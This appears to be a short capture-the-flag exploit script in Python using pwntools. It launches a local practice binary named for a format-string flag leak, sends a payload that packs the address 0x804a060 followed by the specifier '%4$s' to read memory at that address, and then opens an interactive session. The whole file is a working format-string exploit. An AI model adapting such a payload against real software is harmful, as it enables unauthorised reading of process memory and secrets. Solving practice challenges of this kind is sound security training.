from pwn import *

context.log_level = 'debug'
p = process("./Formatstring-leak-flag-in-mem-bss")

payload = p32(0x804a060)
payload += b"%4$s"

p.sendline(payload)
p.interactive()